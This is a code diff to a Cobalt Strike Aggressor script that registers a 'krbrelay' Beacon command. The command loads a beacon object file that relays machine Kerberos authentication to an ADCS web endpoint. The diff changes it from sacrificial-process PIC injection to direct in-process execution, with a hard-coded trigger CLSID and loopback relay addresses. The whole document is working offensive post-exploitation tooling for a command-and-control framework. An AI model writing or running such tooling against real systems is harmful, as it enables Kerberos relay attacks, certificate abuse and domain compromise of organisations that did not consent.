@@ -1,19 +1,18 @@
-println("[+] Loaded KrbRelay direct PIC injection BOF v11-session-bound");
+println("[+] Loaded KrbRelay direct in-process BOF v14");
 
-# Expose a four-argument operator command. The two loopback addresses and the
-# validated trigger CLSID remain internal; environment-specific values do not.
+# The two loopback addresses and validated trigger CLSID remain internal.
 beacon_command_register(
     "krbrelay",
     "Relay machine Kerberos authentication to an ADCS web endpoint",
-    "Usage: krbrelay <sacrificial_process> <relay_port> <service_spn> <rpc_endpoint> <run_nonce>"
+    "Usage: krbrelay <relay_port> <service_spn> <rpc_endpoint>"
 );
 
 alias krbrelay {
     local('$packed $object $handle');
 
-    # The first alias argument is the Beacon ID, leaving four operator values.
-    if (size(@_) != 6) {
-        berror($1, "Usage: krbrelay <sacrificial_process> <relay_port> <service_spn> <rpc_endpoint> <run_nonce>");
+    # The first alias argument is the Beacon ID, leaving three operator values.
+    if (size(@_) != 4) {
+        berror($1, "Usage: krbrelay <relay_port> <service_spn> <rpc_endpoint>");
         return;
     }
 
@@ -22,12 +21,11 @@ alias krbrelay {
         return;
     }
 
-    $handle = openf(script_resource("bof/krbrelay-pic.x64.o"));
+    $handle = openf(script_resource("bof/krbrelay.x64.o"));
     $object = readb($handle, -1);
     closef($handle);
-    # Serialize the process separately, followed by the embedded core's normal
-    # argument block. int() prevents a numeric port becoming a Machine field.
-    $packed = bof_pack($1, "zzizzzzz", $2, "127.0.0.1", int($3), $4, "127.0.0.1", $5, "{90f18417-f0f1-484e-9d3c-59dceee5dbd8}", $6);
-    btask($1, "Running diskless raw-PIC Kerberos relay BOF v11-session-bound");
+    # int() prevents a numeric port becoming a Machine field.
+    $packed = bof_pack($1, "zizzzz", "127.0.0.1", int($2), $3, "127.0.0.1", $4, "{90f18417-f0f1-484e-9d3c-59dceee5dbd8}");
+    btask($1, "Running direct in-process Kerberos relay BOF v14");
     beacon_inline_execute($1, $object, "go", $packed);
 }
